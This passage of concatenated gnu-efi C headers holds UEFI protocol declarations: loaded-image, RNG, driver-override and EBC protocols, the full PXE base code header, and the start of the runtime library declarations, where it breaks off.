    { 0x5B1B31A1, 0x9562, 0x11d2, {0x8E, 0x3F, 0x00, 0xA0, 0xC9, 0x69, 0x72, 0x3B} }
#define LOADED_IMAGE_PROTOCOL EFI_LOADED_IMAGE_PROTOCOL_GUID

#define EFI_LOADED_IMAGE_PROTOCOL_REVISION  0x1000
#define EFI_IMAGE_INFORMATION_REVISION  EFI_LOADED_IMAGE_PROTOCOL_REVISION

typedef
EFI_STATUS
(EFIAPI *EFI_IMAGE_UNLOAD) (
    IN EFI_HANDLE                   ImageHandle
    );

typedef struct {
    UINT32                          Revision;
    EFI_HANDLE                      ParentHandle;
    struct _EFI_SYSTEM_TABLE        *SystemTable;

    // Source location of image
    EFI_HANDLE                      DeviceHandle;
    EFI_DEVICE_PATH                 *FilePath;
    VOID                            *Reserved;

    // Images load options
    UINT32                          LoadOptionsSize;
    VOID                            *LoadOptions;

    // Location of where image was loaded
    VOID                            *ImageBase;
    UINT64                          ImageSize;
    EFI_MEMORY_TYPE                 ImageCodeType;
    EFI_MEMORY_TYPE                 ImageDataType;

    // If the driver image supports a dynamic unload request
    EFI_IMAGE_UNLOAD                Unload;
} EFI_LOADED_IMAGE_PROTOCOL;

typedef EFI_LOADED_IMAGE_PROTOCOL EFI_LOADED_IMAGE;

#define EFI_LOADED_IMAGE_DEVICE_PATH_PROTOCOL_GUID \
    {0xbc62157e, 0x3e33, 0x4fec, {0x99, 0x20, 0x2d, 0x3b, 0x36, 0xd7, 0x50, 0xdf} }

/*
 * Random Number Generator Protocol
 * UEFI Specification Version 2.5 Section 35.5
 */
#define EFI_RNG_PROTOCOL_GUID                          \
          { 0x3152bca5, 0xeade, 0x433d, {0x86, 0x2e, 0xc0, 0x1c, 0xdc, 0x29, 0x1f, 0x44} }

typedef EFI_GUID EFI_RNG_ALGORITHM;

#define EFI_RNG_ALGORITHM_SP800_90_HASH_256_GUID       \
     {0xa7af67cb, 0x603b, 0x4d42, {0xba, 0x21, 0x70, 0xbf, 0xb6, 0x29, 0x3f, 0x96} }

#define EFI_RNG_ALGORITHM_SP800_90_HMAC_256_GUID       \
     {0xc5149b43, 0xae85, 0x4f53, {0x99, 0x82, 0xb9, 0x43, 0x35, 0xd3, 0xa9, 0xe7} }

#define EFI_RNG_ALGORITHM_SP800_90_CTR_256_GUID        \
     {0x44f0de6e, 0x4d8c, 0x4045, {0xa8, 0xc7, 0x4d, 0xd1, 0x68, 0x85, 0x6b, 0x9e} }

#define EFI_RNG_ALGORITHM_X9_31_3DES_GUID              \
     {0x63c4785a, 0xca34, 0x4012, {0xa3, 0xc8, 0x0b, 0x6a, 0x32, 0x4f, 0x55, 0x46} }

#define EFI_RNG_ALGORITHM_X9_31_AES_GUID               \
     {0xacd03321, 0x777e, 0x4d3d, {0xb1, 0xc8, 0x20, 0xcf, 0xd8, 0x88, 0x20, 0xc9} }

#define EFI_RNG_ALGORITHM_RAW                          \
     {0xe43176d7, 0xb6e8, 0x4827, {0xb7, 0x84, 0x7f, 0xfd, 0xc4, 0xb6, 0x85, 0x61} }

INTERFACE_DECL(_EFI_RNG_PROTOCOL);

typedef
EFI_STATUS
(EFIAPI *EFI_RNG_GET_INFO) (
  IN      struct _EFI_RNG_PROTOCOL   *This,
  IN OUT  UINTN                      *RNGAlgorithmListSize,
  OUT     EFI_RNG_ALGORITHM          *RNGAlgorithmList
);

typedef
EFI_STATUS
(EFIAPI *EFI_RNG_GET_RNG) (
  IN      struct _EFI_RNG_PROTOCOL   *This,
  IN      EFI_RNG_ALGORITHM          *RNGAlgorithm,           OPTIONAL
  IN      UINTN                      RNGValueLength,
  OUT     UINT8                      *RNGValue
);

typedef struct _EFI_RNG_PROTOCOL {
          EFI_RNG_GET_INFO           GetInfo;
          EFI_RNG_GET_RNG            GetRNG;
} EFI_RNG_PROTOCOL;


//
// EFI_PLATFORM_DRIVER_OVERRIDE_PROTOCOL
//

#define EFI_PLATFORM_DRIVER_OVERRIDE_PROTOCOL_GUID          \
          { 0x6b30c738, 0xa391, 0x11d4, {0x9a, 0x3b, 0x00, 0x90, 0x27, 0x3f, 0xc1, 0x4d} }

INTERFACE_DECL(_EFI_PLATFORM_DRIVER_OVERRIDE_PROTOCOL);

typedef
EFI_STATUS
(EFIAPI *EFI_PLATFORM_DRIVER_OVERRIDE_GET_DRIVER) (
IN      struct _EFI_PLATFORM_DRIVER_OVERRIDE_PROTOCOL  *This,
IN      EFI_HANDLE                                      ControllerHandle,
IN OUT  EFI_HANDLE                                     *DriverImageHandle);

typedef
EFI_STATUS
(EFIAPI *EFI_PLATFORM_DRIVER_OVERRIDE_GET_DRIVER_PATH) (
IN      struct _EFI_PLATFORM_DRIVER_OVERRIDE_PROTOCOL  *This,
IN      EFI_HANDLE                                      ControllerHandle,
IN OUT  EFI_DEVICE_PATH                               **DriverImagePath);

typedef
EFI_STATUS
(EFIAPI *EFI_PLATFORM_DRIVER_OVERRIDE_DRIVER_LOADED) (
IN      struct _EFI_PLATFORM_DRIVER_OVERRIDE_PROTOCOL  *This,
IN      EFI_HANDLE                                      ControllerHandle,
IN      EFI_DEVICE_PATH                                *DriverImagePath,
IN      EFI_HANDLE                                      DriverImageHandle);

typedef struct _EFI_PLATFORM_DRIVER_OVERRIDE_PROTOCOL {
  EFI_PLATFORM_DRIVER_OVERRIDE_GET_DRIVER       GetDriver;
  EFI_PLATFORM_DRIVER_OVERRIDE_GET_DRIVER_PATH  GetDriverPath;
  EFI_PLATFORM_DRIVER_OVERRIDE_DRIVER_LOADED    DriverLoaded;
} EFI_PLATFORM_DRIVER_OVERRIDE_PROTOCOL;

//
// EFI_BUS_SPECIFIC_DRIVER_OVERRIDE_PROTOCOL
//

#define EFI_BUS_SPECIFIC_DRIVER_OVERRIDE_PROTOCOL_GUID          \
          { 0x3bc1b285, 0x8a15, 0x4a82, {0xaa, 0xbf, 0x4d, 0x7d, 0x13, 0xfb, 0x32, 0x65} }

INTERFACE_DECL(_EFI_BUS_SPECIFIC_DRIVER_OVERRIDE_PROTOCOL);

typedef
EFI_STATUS
(EFIAPI *EFI_BUS_SPECIFIC_DRIVER_OVERRIDE_GET_DRIVER) (
IN      struct _EFI_BUS_SPECIFIC_DRIVER_OVERRIDE_PROTOCOL  *This,
IN OUT  EFI_HANDLE                                         *DriverImageHandle);

typedef struct _EFI_BUS_SPECIFIC_DRIVER_OVERRIDE_PROTOCOL {
  EFI_BUS_SPECIFIC_DRIVER_OVERRIDE_GET_DRIVER       GetDriver;
} EFI_BUS_SPECIFIC_DRIVER_OVERRIDE_PROTOCOL;

//
// EFI_DRIVER_FAMILY_OVERRIDE_PROTOCOL
//

#define EFI_DRIVER_FAMILY_OVERRIDE_PROTOCOL_GUID          \
          { 0xb1ee129e, 0xda36, 0x4181, {0x91, 0xf8, 0x04, 0xa4, 0x92, 0x37, 0x66, 0xa7} }

INTERFACE_DECL(_EFI_DRIVER_FAMILY_OVERRIDE_PROTOCOL);

typedef
UINT32
(EFIAPI *EFI_DRIVER_FAMILY_OVERRIDE_GET_VERSION) (
IN      struct _EFI_DRIVER_FAMILY_OVERRIDE_PROTOCOL  *This);

typedef struct _EFI_DRIVER_FAMILY_OVERRIDE_PROTOCOL {
  EFI_DRIVER_FAMILY_OVERRIDE_GET_VERSION       GetVersion;
} EFI_DRIVER_FAMILY_OVERRIDE_PROTOCOL;

//
// EFI_EBC_PROTOCOL
//

#define EFI_EBC_INTERPRETER_PROTOCOL_GUID              \
     {0x13ac6dd1, 0x73d0, 0x11d4, {0xb0, 0x6b, 0x00, 0xaa, 0x00, 0xbd, 0x6d, 0xe7} }

#define EFI_EBC_PROTOCOL_GUID EFI_EBC_INTERPRETER_PROTOCOL_GUID

INTERFACE_DECL(_EFI_EBC_PROTOCOL);

typedef
EFI_STATUS
(EFIAPI *EFI_EBC_CREATE_THUNK)(
  IN struct _EFI_EBC_PROTOCOL   *This,
  IN EFI_HANDLE                 ImageHandle,
  IN VOID                       *EbcEntryPoint,
  OUT VOID                      **Thunk);

typedef
EFI_STATUS
(EFIAPI *EFI_EBC_UNLOAD_IMAGE)(
  IN struct _EFI_EBC_PROTOCOL   *This,
  IN EFI_HANDLE                 ImageHandle);

typedef
EFI_STATUS
(EFIAPI *EBC_ICACHE_FLUSH)(
  IN EFI_PHYSICAL_ADDRESS       Start,
  IN UINT64                     Length);

typedef
EFI_STATUS
(EFIAPI *EFI_EBC_REGISTER_ICACHE_FLUSH)(
  IN struct _EFI_EBC_PROTOCOL   *This,
  IN EBC_ICACHE_FLUSH           Flush);

typedef
EFI_STATUS
(EFIAPI *EFI_EBC_GET_VERSION)(
  IN struct _EFI_EBC_PROTOCOL   *This,
  IN OUT UINT64                 *Version);

typedef struct _EFI_EBC_PROTOCOL {
  EFI_EBC_CREATE_THUNK          CreateThunk;
  EFI_EBC_UNLOAD_IMAGE          UnloadImage;
  EFI_EBC_REGISTER_ICACHE_FLUSH RegisterICacheFlush;
  EFI_EBC_GET_VERSION           GetVersion;
} EFI_EBC_PROTOCOL;

#endif

```

`include/gnu-efi/efipxebc.h`:

```h
#ifndef _EFIPXEBC_H
#define _EFIPXEBC_H

/*++

Copyright (c) 1998  Intel Corporation

Module Name:

    efipxebc.h

Abstract:

    EFI PXE Base Code Protocol



Revision History

--*/

//
// PXE Base Code protocol
//

#define EFI_PXE_BASE_CODE_PROTOCOL_GUID \
    { 0x03c4e603, 0xac28, 0x11d3, {0x9a, 0x2d, 0x00, 0x90, 0x27, 0x3f, 0xc1, 0x4d} }

INTERFACE_DECL(_EFI_PXE_BASE_CODE_PROTOCOL);

#define DEFAULT_TTL 4
#define DEFAULT_ToS 0
//
// Address definitions
//

typedef union {
    UINT32      Addr[4];
    EFI_IPv4_ADDRESS    v4;
    EFI_IPv6_ADDRESS    v6;
} EFI_IP_ADDRESS;

typedef UINT16 EFI_PXE_BASE_CODE_UDP_PORT;

//
// Packet definitions
//

typedef struct {
    UINT8                           BootpOpcode;
    UINT8                           BootpHwType;
    UINT8                           BootpHwAddrLen;
    UINT8                           BootpGateHops;
    UINT32                          BootpIdent;
    UINT16                          BootpSeconds;
    UINT16                          BootpFlags;
    UINT8                           BootpCiAddr[4];
    UINT8                           BootpYiAddr[4];
    UINT8                           BootpSiAddr[4];
    UINT8                           BootpGiAddr[4];
    UINT8                           BootpHwAddr[16];
    UINT8                           BootpSrvName[64];
    UINT8                           BootpBootFile[128];
    UINT32                          DhcpMagik;
    UINT8                           DhcpOptions[56];
} EFI_PXE_BASE_CODE_DHCPV4_PACKET;

typedef struct {
    UINT32                          MessageType:8;
    UINT32                          TransactionId:24;
    UINT8                           DhcpOptions[1024];
} EFI_PXE_BASE_CODE_DHCPV6_PACKET;

typedef union {
    UINT8                               Raw[1472];
    EFI_PXE_BASE_CODE_DHCPV4_PACKET     Dhcpv4;
    EFI_PXE_BASE_CODE_DHCPV6_PACKET     Dhcpv6;
} EFI_PXE_BASE_CODE_PACKET;

typedef struct {
    UINT8                   Type;
    UINT8                   Code;
    UINT16                  Checksum;
    union {
        UINT32              reserved;
        UINT32              Mtu;
        UINT32              Pointer;
        struct {
            UINT16          Identifier;
            UINT16          Sequence;
        } Echo;
    } u;
    UINT8                   Data[494];
} EFI_PXE_BASE_CODE_ICMP_ERROR;

typedef struct {
    UINT8                   ErrorCode;
    CHAR8                   ErrorString[127];
} EFI_PXE_BASE_CODE_TFTP_ERROR;

//
// IP Receive Filter definitions
//
#define EFI_PXE_BASE_CODE_MAX_IPCNT             8
typedef struct {
    UINT8                       Filters;
    UINT8                       IpCnt;
    UINT16                      reserved;
    EFI_IP_ADDRESS              IpList[EFI_PXE_BASE_CODE_MAX_IPCNT];
} EFI_PXE_BASE_CODE_IP_FILTER;

#define EFI_PXE_BASE_CODE_IP_FILTER_STATION_IP             0x0001
#define EFI_PXE_BASE_CODE_IP_FILTER_BROADCAST              0x0002
#define EFI_PXE_BASE_CODE_IP_FILTER_PROMISCUOUS            0x0004
#define EFI_PXE_BASE_CODE_IP_FILTER_PROMISCUOUS_MULTICAST  0x0008

//
// ARP Cache definitions
//

typedef struct {
    EFI_IP_ADDRESS       IpAddr;
    EFI_MAC_ADDRESS      MacAddr;
} EFI_PXE_BASE_CODE_ARP_ENTRY;

typedef struct {
    EFI_IP_ADDRESS       IpAddr;
    EFI_IP_ADDRESS       SubnetMask;
    EFI_IP_ADDRESS       GwAddr;
} EFI_PXE_BASE_CODE_ROUTE_ENTRY;

//
// UDP definitions
//

#define EFI_PXE_BASE_CODE_UDP_OPFLAGS_ANY_SRC_IP    0x0001
#define EFI_PXE_BASE_CODE_UDP_OPFLAGS_ANY_SRC_PORT  0x0002
#define EFI_PXE_BASE_CODE_UDP_OPFLAGS_ANY_DEST_IP   0x0004
#define EFI_PXE_BASE_CODE_UDP_OPFLAGS_ANY_DEST_PORT 0x0008
#define EFI_PXE_BASE_CODE_UDP_OPFLAGS_USE_FILTER    0x0010
#define EFI_PXE_BASE_CODE_UDP_OPFLAGS_MAY_FRAGMENT  0x0020

//
// Discover() definitions
//

#define EFI_PXE_BASE_CODE_BOOT_TYPE_BOOTSTRAP           0
#define EFI_PXE_BASE_CODE_BOOT_TYPE_MS_WINNT_RIS        1
#define EFI_PXE_BASE_CODE_BOOT_TYPE_INTEL_LCM           2
#define EFI_PXE_BASE_CODE_BOOT_TYPE_DOSUNDI             3
#define EFI_PXE_BASE_CODE_BOOT_TYPE_NEC_ESMPRO          4
#define EFI_PXE_BASE_CODE_BOOT_TYPE_IBM_WSoD            5
#define EFI_PXE_BASE_CODE_BOOT_TYPE_IBM_LCCM            6
#define EFI_PXE_BASE_CODE_BOOT_TYPE_CA_UNICENTER_TNG    7
#define EFI_PXE_BASE_CODE_BOOT_TYPE_HP_OPENVIEW         8
#define EFI_PXE_BASE_CODE_BOOT_TYPE_ALTIRIS_9           9
#define EFI_PXE_BASE_CODE_BOOT_TYPE_ALTIRIS_10          10
#define EFI_PXE_BASE_CODE_BOOT_TYPE_ALTIRIS_11          11
#define EFI_PXE_BASE_CODE_BOOT_TYPE_NOT_USED_12         12
#define EFI_PXE_BASE_CODE_BOOT_TYPE_REDHAT_INSTALL      13
#define EFI_PXE_BASE_CODE_BOOT_TYPE_REDHAT_BOOT         14
#define EFI_PXE_BASE_CODE_BOOT_TYPE_REMBO               15
#define EFI_PXE_BASE_CODE_BOOT_TYPE_BEOBOOT             16
//
// 17 through 32767 are reserved
// 32768 through 65279 are for vendor use
// 65280 through 65534 are reserved
//
#define EFI_PXE_BASE_CODE_BOOT_TYPE_PXETEST             65535

#define EFI_PXE_BASE_CODE_BOOT_LAYER_MASK               0x7FFF
#define EFI_PXE_BASE_CODE_BOOT_LAYER_INITIAL            0x0000


typedef struct {
    UINT16                      Type;
    BOOLEAN                     AcceptAnyResponse;
    UINT8                       Reserved;
    EFI_IP_ADDRESS              IpAddr;
} EFI_PXE_BASE_CODE_SRVLIST;

typedef struct {
    BOOLEAN                     UseMCast;
    BOOLEAN                     UseBCast;
    BOOLEAN                     UseUCast;
    BOOLEAN                     MustUseList;
    EFI_IP_ADDRESS              ServerMCastIp;
    UINT16                      IpCnt;
    EFI_PXE_BASE_CODE_SRVLIST   SrvList[1];
} EFI_PXE_BASE_CODE_DISCOVER_INFO;

//
// Mtftp() definitions
//

typedef enum {
    EFI_PXE_BASE_CODE_TFTP_FIRST,
    EFI_PXE_BASE_CODE_TFTP_GET_FILE_SIZE,
    EFI_PXE_BASE_CODE_TFTP_READ_FILE,
    EFI_PXE_BASE_CODE_TFTP_WRITE_FILE,
    EFI_PXE_BASE_CODE_TFTP_READ_DIRECTORY,
    EFI_PXE_BASE_CODE_MTFTP_GET_FILE_SIZE,
    EFI_PXE_BASE_CODE_MTFTP_READ_FILE,
    EFI_PXE_BASE_CODE_MTFTP_READ_DIRECTORY,
    EFI_PXE_BASE_CODE_MTFTP_LAST
} EFI_PXE_BASE_CODE_TFTP_OPCODE;

typedef struct {
    EFI_IP_ADDRESS   MCastIp;
    EFI_PXE_BASE_CODE_UDP_PORT  CPort;
    EFI_PXE_BASE_CODE_UDP_PORT  SPort;
    UINT16                      ListenTimeout;
    UINT16                      TransmitTimeout;
} EFI_PXE_BASE_CODE_MTFTP_INFO;

//
// PXE Base Code Mode structure
//

#define EFI_PXE_BASE_CODE_MAX_ARP_ENTRIES       8
#define EFI_PXE_BASE_CODE_MAX_ROUTE_ENTRIES     8

typedef struct {
    BOOLEAN                         Started;
    BOOLEAN                         Ipv6Available;
    BOOLEAN                         Ipv6Supported;
    BOOLEAN                         UsingIpv6;
    BOOLEAN                         BisSupported;
    BOOLEAN                         BisDetected;
    BOOLEAN                         AutoArp;
    BOOLEAN                         SendGUID;
    BOOLEAN                         DhcpDiscoverValid;
    BOOLEAN                         DhcpAckReceived;
    BOOLEAN                         ProxyOfferReceived;
    BOOLEAN                         PxeDiscoverValid;
    BOOLEAN                         PxeReplyReceived;
    BOOLEAN                         PxeBisReplyReceived;
    BOOLEAN                         IcmpErrorReceived;
    BOOLEAN                         TftpErrorReceived;
    BOOLEAN                         MakeCallbacks;
    UINT8                           TTL;
    UINT8                           ToS;
    EFI_IP_ADDRESS                  StationIp;
    EFI_IP_ADDRESS                  SubnetMask;
    EFI_PXE_BASE_CODE_PACKET        DhcpDiscover;
    EFI_PXE_BASE_CODE_PACKET        DhcpAck;
    EFI_PXE_BASE_CODE_PACKET        ProxyOffer;
    EFI_PXE_BASE_CODE_PACKET        PxeDiscover;
    EFI_PXE_BASE_CODE_PACKET        PxeReply;
    EFI_PXE_BASE_CODE_PACKET        PxeBisReply;
    EFI_PXE_BASE_CODE_IP_FILTER     IpFilter;
    UINT32                          ArpCacheEntries;
    EFI_PXE_BASE_CODE_ARP_ENTRY     ArpCache[EFI_PXE_BASE_CODE_MAX_ARP_ENTRIES];
    UINT32                          RouteTableEntries;
    EFI_PXE_BASE_CODE_ROUTE_ENTRY   RouteTable[EFI_PXE_BASE_CODE_MAX_ROUTE_ENTRIES];
    EFI_PXE_BASE_CODE_ICMP_ERROR    IcmpError;
    EFI_PXE_BASE_CODE_TFTP_ERROR    TftpError;
} EFI_PXE_BASE_CODE_MODE;

//
// PXE Base Code Interface Function definitions
//

typedef
EFI_STATUS
(EFIAPI *EFI_PXE_BASE_CODE_START) (
    IN struct _EFI_PXE_BASE_CODE_PROTOCOL  *This,
    IN BOOLEAN                             UseIpv6
    );

typedef
EFI_STATUS
(EFIAPI *EFI_PXE_BASE_CODE_STOP) (
    IN struct _EFI_PXE_BASE_CODE_PROTOCOL  *This
    );

typedef
EFI_STATUS
(EFIAPI *EFI_PXE_BASE_CODE_DHCP) (
    IN struct _EFI_PXE_BASE_CODE_PROTOCOL  *This,
    IN BOOLEAN                             SortOffers
    );

typedef
EFI_STATUS
(EFIAPI *EFI_PXE_BASE_CODE_DISCOVER) (
    IN struct _EFI_PXE_BASE_CODE_PROTOCOL   *This,
    IN UINT16                               Type,
    IN UINT16                               *Layer,
    IN BOOLEAN                              UseBis,
    IN OUT EFI_PXE_BASE_CODE_DISCOVER_INFO  *Info   OPTIONAL
    );

typedef
EFI_STATUS
(EFIAPI *EFI_PXE_BASE_CODE_MTFTP) (
    IN struct _EFI_PXE_BASE_CODE_PROTOCOL  *This,
    IN EFI_PXE_BASE_CODE_TFTP_OPCODE       Operation,
    IN OUT VOID                            *BufferPtr  OPTIONAL,
    IN BOOLEAN                             Overwrite,
    IN OUT UINT64                          *BufferSize,
    IN UINTN                               *BlockSize  OPTIONAL,
    IN EFI_IP_ADDRESS                      *ServerIp,
    IN UINT8                               *Filename,
    IN EFI_PXE_BASE_CODE_MTFTP_INFO        *Info       OPTIONAL,
    IN BOOLEAN                             DontUseBuffer
    );

typedef
EFI_STATUS
(EFIAPI *EFI_PXE_BASE_CODE_UDP_WRITE) (
    IN struct _EFI_PXE_BASE_CODE_PROTOCOL  *This,
    IN UINT16                              OpFlags,
    IN EFI_IP_ADDRESS                      *DestIp,
    IN EFI_PXE_BASE_CODE_UDP_PORT          *DestPort,
    IN EFI_IP_ADDRESS                      *GatewayIp,  OPTIONAL
    IN EFI_IP_ADDRESS                      *SrcIp,      OPTIONAL
    IN OUT EFI_PXE_BASE_CODE_UDP_PORT      *SrcPort,    OPTIONAL
    IN UINTN                               *HeaderSize, OPTIONAL
    IN VOID                                *HeaderPtr,  OPTIONAL
    IN UINTN                               *BufferSize,
    IN VOID                                *BufferPtr
    );

typedef
EFI_STATUS
(EFIAPI *EFI_PXE_BASE_CODE_UDP_READ) (
    IN struct _EFI_PXE_BASE_CODE_PROTOCOL  *This,
    IN UINT16                              OpFlags,
    IN OUT EFI_IP_ADDRESS                  *DestIp,      OPTIONAL
    IN OUT EFI_PXE_BASE_CODE_UDP_PORT      *DestPort,    OPTIONAL
    IN OUT EFI_IP_ADDRESS                  *SrcIp,       OPTIONAL
    IN OUT EFI_PXE_BASE_CODE_UDP_PORT      *SrcPort,     OPTIONAL
    IN UINTN                               *HeaderSize,  OPTIONAL
    IN VOID                                *HeaderPtr,   OPTIONAL
    IN OUT UINTN                           *BufferSize,
    IN VOID                                *BufferPtr
    );

typedef
EFI_STATUS
(EFIAPI *EFI_PXE_BASE_CODE_SET_IP_FILTER) (
    IN struct _EFI_PXE_BASE_CODE_PROTOCOL  *This,
    IN EFI_PXE_BASE_CODE_IP_FILTER         *NewFilter
    );

typedef
EFI_STATUS
(EFIAPI *EFI_PXE_BASE_CODE_ARP) (
    IN struct _EFI_PXE_BASE_CODE_PROTOCOL  *This,
    IN EFI_IP_ADDRESS                      *IpAddr,
    IN EFI_MAC_ADDRESS                     *MacAddr      OPTIONAL
    );

typedef
EFI_STATUS
(EFIAPI *EFI_PXE_BASE_CODE_SET_PARAMETERS) (
    IN struct _EFI_PXE_BASE_CODE_PROTOCOL  *This,
    IN BOOLEAN                             *NewAutoArp,    OPTIONAL
    IN BOOLEAN                             *NewSendGUID,   OPTIONAL
    IN UINT8                               *NewTTL,        OPTIONAL
    IN UINT8                               *NewToS,        OPTIONAL
    IN BOOLEAN                             *NewMakeCallback    OPTIONAL
    );

typedef
EFI_STATUS
(EFIAPI *EFI_PXE_BASE_CODE_SET_STATION_IP) (
    IN struct _EFI_PXE_BASE_CODE_PROTOCOL  *This,
    IN EFI_IP_ADDRESS                      *NewStationIp,  OPTIONAL
    IN EFI_IP_ADDRESS                      *NewSubnetMask  OPTIONAL
    );

typedef
EFI_STATUS
(EFIAPI *EFI_PXE_BASE_CODE_SET_PACKETS) (
    IN struct _EFI_PXE_BASE_CODE_PROTOCOL  *This,
    BOOLEAN                                *NewDhcpDiscoverValid,  OPTIONAL
    BOOLEAN                                *NewDhcpAckReceived,    OPTIONAL
    BOOLEAN                                *NewProxyOfferReceived, OPTIONAL
    BOOLEAN                                *NewPxeDiscoverValid,   OPTIONAL
    BOOLEAN                                *NewPxeReplyReceived,   OPTIONAL
    BOOLEAN                                *NewPxeBisReplyReceived,OPTIONAL
    IN EFI_PXE_BASE_CODE_PACKET            *NewDhcpDiscover, OPTIONAL
    IN EFI_PXE_BASE_CODE_PACKET            *NewDhcpAck,      OPTIONAL
    IN EFI_PXE_BASE_CODE_PACKET            *NewProxyOffer,   OPTIONAL
    IN EFI_PXE_BASE_CODE_PACKET            *NewPxeDiscover,  OPTIONAL
    IN EFI_PXE_BASE_CODE_PACKET            *NewPxeReply,     OPTIONAL
    IN EFI_PXE_BASE_CODE_PACKET            *NewPxeBisReply   OPTIONAL
    );

//
// PXE Base Code Protocol structure
//

#define EFI_PXE_BASE_CODE_PROTOCOL_REVISION  0x00010000
#define EFI_PXE_BASE_CODE_INTERFACE_REVISION EFI_PXE_BASE_CODE_PROTOCOL_REVISION

typedef struct _EFI_PXE_BASE_CODE_PROTOCOL {
    UINT64                              Revision;
    EFI_PXE_BASE_CODE_START             Start;
    EFI_PXE_BASE_CODE_STOP              Stop;
    EFI_PXE_BASE_CODE_DHCP              Dhcp;
    EFI_PXE_BASE_CODE_DISCOVER          Discover;
    EFI_PXE_BASE_CODE_MTFTP             Mtftp;
    EFI_PXE_BASE_CODE_UDP_WRITE         UdpWrite;
    EFI_PXE_BASE_CODE_UDP_READ          UdpRead;
    EFI_PXE_BASE_CODE_SET_IP_FILTER     SetIpFilter;
    EFI_PXE_BASE_CODE_ARP               Arp;
    EFI_PXE_BASE_CODE_SET_PARAMETERS    SetParameters;
    EFI_PXE_BASE_CODE_SET_STATION_IP    SetStationIp;
    EFI_PXE_BASE_CODE_SET_PACKETS       SetPackets;
    EFI_PXE_BASE_CODE_MODE              *Mode;
} EFI_PXE_BASE_CODE_PROTOCOL;

// Note: Because it conflicted with the EDK2 struct name, the
// 'EFI_PXE_BASE_CODE_PROTOCOL' GUID definition, from older
// versions of gnu-efi, is now obsoleted.
// Use 'EFI_PXE_BASE_CODE_PROTOCOL_GUID' instead.

typedef struct _EFI_PXE_BASE_CODE_PROTOCOL _EFI_PXE_BASE_CODE;
typedef struct _EFI_PXE_BASE_CODE_PROTOCOL EFI_PXE_BASE_CODE;

//
// Call Back Definitions
//

#define EFI_PXE_BASE_CODE_CALLBACK_PROTOCOL_GUID \
    { 0x245dca21, 0xfb7b, 0x11d3, {0x8f, 0x01, 0x00, 0xa0, 0xc9, 0x69, 0x72, 0x3b} }

//
// Revision Number
//

#define EFI_PXE_BASE_CODE_CALLBACK_PROTOCOL_REVISION  0x00010000
#define EFI_PXE_BASE_CODE_CALLBACK_INTERFACE_REVISION EFI_PXE_BASE_CODE_CALLBACK_PROTOCOL_REVISION

INTERFACE_DECL(_EFI_PXE_BASE_CODE_CALLBACK_PROTOCOL);

typedef enum {
    EFI_PXE_BASE_CODE_FUNCTION_FIRST,
    EFI_PXE_BASE_CODE_FUNCTION_DHCP,
    EFI_PXE_BASE_CODE_FUNCTION_DISCOVER,
    EFI_PXE_BASE_CODE_FUNCTION_MTFTP,
    EFI_PXE_BASE_CODE_FUNCTION_UDP_WRITE,
    EFI_PXE_BASE_CODE_FUNCTION_UDP_READ,
    EFI_PXE_BASE_CODE_FUNCTION_ARP,
    EFI_PXE_BASE_CODE_FUNCTION_IGMP,
    EFI_PXE_BASE_CODE_PXE_FUNCTION_LAST
} EFI_PXE_BASE_CODE_FUNCTION;

typedef enum {
    EFI_PXE_BASE_CODE_CALLBACK_STATUS_FIRST,
    EFI_PXE_BASE_CODE_CALLBACK_STATUS_CONTINUE,
    EFI_PXE_BASE_CODE_CALLBACK_STATUS_ABORT,
    EFI_PXE_BASE_CODE_CALLBACK_STATUS_LAST
} EFI_PXE_BASE_CODE_CALLBACK_STATUS;

typedef
EFI_PXE_BASE_CODE_CALLBACK_STATUS
(EFIAPI *EFI_PXE_CALLBACK) (
    IN struct _EFI_PXE_BASE_CODE_CALLBACK_PROTOCOL  *This,
    IN EFI_PXE_BASE_CODE_FUNCTION                   Function,
    IN BOOLEAN                                      Received,
    IN UINT32                                       PacketLen,
    IN EFI_PXE_BASE_CODE_PACKET                     *Packet     OPTIONAL
    );

typedef struct _EFI_PXE_BASE_CODE_CALLBACK_PROTOCOL {
    UINT64                      Revision;
    EFI_PXE_CALLBACK            Callback;
} EFI_PXE_BASE_CODE_CALLBACK_PROTOCOL;

// Note: Because it conflicted with the EDK2 struct name, the
// 'EFI_PXE_BASE_CODE_CALLBACK_PROTOCOL' GUID definition, from
// older versions of gnu-efi, is now obsoleted.
// Use 'EFI_PXE_BASE_CODE_CALLBACK_PROTOCOL_GUID' instead.

typedef struct _EFI_PXE_BASE_CODE_CALLBACK_PROTOCOL _EFI_PXE_BASE_CODE_CALLBACK;
typedef EFI_PXE_BASE_CODE_CALLBACK_PROTOCOL EFI_PXE_BASE_CODE_CALLBACK;

#endif /* _EFIPXEBC_H */

```

`include/gnu-efi/efirtlib.h`:

```h
#ifndef _EFI_RT_LIB_INCLUDE_
#define _EFI_RT_LIB_INCLUDE_
/*++

Copyright (c) 1998  Intel Corporation

Module Name:

    efilib.h

Abstract:

    EFI Runtime library functions



Revision History

--*/

#include "efidebug.h"
#include "efipart.h"
#if defined(_M_X64) || defined(__x86_64__) || defined(__amd64__)
#include "x86_64/efilibplat.h"
#elif defined(_M_IX86) || defined(__i386__)
#include "ia32/efilibplat.h"
#elif defined(_M_IA64) || defined(__ia64__)
#include "ia64/efilibplat.h"
#elif defined (_M_ARM64) || defined(__aarch64__)
#include "aarch64/efilibplat.h"
#elif defined (_M_ARM) || defined(__arm__)
#include "arm/efilibplat.h"
#elif defined (_M_MIPS64) || defined(__mips64__)
#include "mips64el/efilibplat.h"
#elif defined (__riscv) && __riscv_xlen == 64
#include "riscv64/efilibplat.h"
#endif


VOID
RUNTIMEFUNCTION
RtZeroMem (
    IN VOID     *Buffer,
    IN UINTN     Size
    );

VOID
RUNTIMEFUNCTION
RtSetMem (
    IN VOID     *Buffer,
    IN UINTN    Size,
    IN UINT8    Value    
    );

VOID
RUNTIMEFUNCTION
RtCopyMem (
    IN VOID     *Dest,
    IN CONST VOID     *Src,
    IN UINTN    len
    );

INTN
RUNTIMEFUNCTION
RtCompareMem (
    IN CONST VOID     *Dest,
    IN CONST VOID     *Src,
    IN UINTN    len
    );

INTN
RUNTIMEFUNCTION
RtStrCmp (
    IN CONST CHAR16   *s1,
    IN CONST CHAR16   *s2
    );


VOID
RUNTIMEFUNCTION
RtStrCpy (
    IN CHAR16   *Dest,
    IN CONST CHAR16    *Src
    );

VOID
RUNTIMEFUNCTION
RtStrnCpy (
    IN CHAR16   *Dest,
    IN CONST CHAR16    *Src,
    IN UINTN     Len
    );

CHAR16 *
RUNTIMEFUNCTION
RtStpCpy (
    IN CHAR16   *Dest,
    IN CONST CHAR16    *Src
    );

CHAR16 *
RUNTIMEFUNCTION
RtStpnCpy (
